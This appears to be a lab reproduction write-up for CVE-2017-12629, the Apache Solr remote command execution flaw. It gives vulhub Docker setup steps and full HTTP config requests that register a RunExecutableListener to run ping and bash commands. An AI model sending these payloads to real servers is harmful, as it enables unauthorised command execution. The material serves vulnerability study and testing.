---
title: Apache Solr RCE Remote Command Execution Vulnerability CVE-2017-12629
---

# Apache Solr RCE Remote Command Execution Vulnerability CVE-2017-12629

## Vulnerability Description
Apache Solr is an open source search server. 

## Affect Version
<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Apache Solr < 7.1</span>

## Environment construction
```shell
git clone https://github.com/vulhub/vulhub.git
cd vulhub/solr/CVE-2017-12629
docker-compose build
docker-compose up -d
```

## Vulnerability reappears
First request the url address to obtain core content
```shell
/solr/admin/cores
```
By viewing the code, there are two events that can trigger command execution: `postCommit` and `newSearcher`

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/ec27d0b9-f86d-43b7-9fe4-1bba02cbf334.png)



The first request package is used to load the cache

```
exe : ping  执行的命令
dir: 命令存在的目录位置
args:命令参数
```

The following request package executes /bin/ping 1.1.1.1

```shell
POST /solr/demo/config HTTP/1.1
Host:
Connection: close
Content-Type: application/json  
Content-Length: 198

{
  "add-listener" : {
    "event":"postCommit",
    "name":"newlistener-1",
    "class":"solr.RunExecutableListener",
    "exe":"ping",
    "dir":"/bin/",
    "args":["1.1.1.1"]
  }
}
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/image-20220307151501330.png)

The second request package is used to update the cache and execute commands

```shell
POST /solr/demo/update

[{"id":"test"}]
```
Enter the docker container to see that the command has been executed

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/53ffedcf-5cc3-42cf-9623-a076ed001ac8.png)

Use newSearcher to load cache execution commands directly

```shell
POST /solr/demo/config HTTP/1.1
Host:
Connection: close
Content-Type: application/json  
Content-Length: 198

{
  "add-listener" : {
    "event":"newSearcher",
    "name":"newlistener-2",
    "class":"solr.RunExecutableListener",
    "exe":"bash",
    "dir":"/bin/",
    "args":[
         "-c",
         "mkdir /tmp/vuln",
    ]
  }
}
```

The command to create the file was successfully executed

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/567692f5-4845-439f-b747-020011068da8.png)

If you want to execute other commands, you need to have the location of the command. For example, if you execute ping, you need to set the dir parameter to /usr/bin/ping or /bin/ping. If you need to detect whether the vulnerability exists, you can use dnslog to detect it.
